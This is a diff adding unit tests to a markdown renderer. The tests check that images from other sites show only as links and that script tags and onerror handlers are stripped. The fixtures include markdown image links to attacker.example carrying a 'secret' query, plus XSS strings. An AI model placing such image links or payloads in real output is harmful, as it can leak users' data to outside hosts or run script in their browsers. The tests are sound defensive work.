@@ -115,6 +115,23 @@ describe("MarkdownText", () => {
     expect(html).not.toContain("javascript:");
   });
 
+  it("shows an image of The Office's own, and another site's only as a link by its alt text", () => {
+    const page = document.createElement("div");
+    page.innerHTML = rendered(
+      "![chart](/api/attachments/a1/content) ![shot](https://attacker.example/?q=secret) ![](//attacker.example/x.png)",
+    );
+
+    expect([...page.querySelectorAll("img")].map((image) => image.getAttribute("src"))).toEqual([
+      "/api/attachments/a1/content",
+    ]);
+    const links = [...page.querySelectorAll("a")];
+    expect(links.map((link) => [link.textContent, link.getAttribute("href")])).toEqual([
+      ["shot", "https://attacker.example/?q=secret"],
+      ["//attacker.example/x.png", "//attacker.example/x.png"],
+    ]);
+    expect(links.every((link) => link.getAttribute("rel") === "noreferrer noopener")).toBe(true);
+  });
+
   it("copies a code block's code exactly and says so", async () => {
     const writeText = withClipboard();
     const { page } = await mounted("Send this:\n\n```\ngit log --oneline\n  -n 5\n```");
@@ -234,6 +251,17 @@ describe("MarkdownDocument", () => {
     const page = documentOf('<script>alert(1)</script>\n\n<img src="x" onerror="alert(1)">');
     expect(page.querySelector("script, img, [onerror]")).toBeNull();
     expect(page.textContent).toContain("<script>alert(1)</script>");
+  });
+
+  it("loads no image from another site", () => {
+    const page = documentOf("![logo](logo.png)\n\n![tracker](http://attacker.example/pixel.gif)");
+
+    expect([...page.querySelectorAll("img")].map((image) => image.getAttribute("src"))).toEqual([
+      "logo.png",
+    ]);
+    expect(page.querySelector('a[href="http://attacker.example/pixel.gif"]')?.textContent).toBe(
+      "tracker",
+    );
   });
 
   it("drops a javascript: link's target and opens others in a new tab", () => {
